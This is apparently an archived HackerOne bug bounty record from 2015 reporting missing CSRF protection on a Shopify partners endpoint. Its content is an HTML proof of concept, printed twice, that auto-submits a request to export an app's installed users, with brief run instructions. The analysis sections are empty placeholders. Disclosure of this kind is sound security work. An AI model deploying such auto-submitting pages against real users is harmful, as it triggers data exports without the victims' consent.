# Missing of csrf protection 

## Metadata
- **Source:** HackerOne
- **Report:** 96470 | https://hackerone.com/reports/96470
- **Submitted:** 2015-10-29
- **Reporter:** harishkumar0394
- **Program:** Unknown
- **Bounty:** $500
- **Severity:** unknown
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
<html>
<head><title>csrf</title></head>
<body onLoad="document.forms[0].submit()">
<form action="https://app.shopify.com/services/partners/api_clients/1105664/export_installed_users" method="GET">
</form>
</body>
</html>

change the 1105664 app id to your app id the save as html file and run

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

<html>
<head><title>csrf</title></head>
<body onLoad="document.forms[0].submit()">
<form action="https://app.shopify.com/services/partners/api_clients/1105664/export_installed_users" method="GET">
</form>
</body>
</html>

change the 1105664 app id to your app id the save as html file and run

</details>

---
*Analysed by Claude on 2026-05-24*
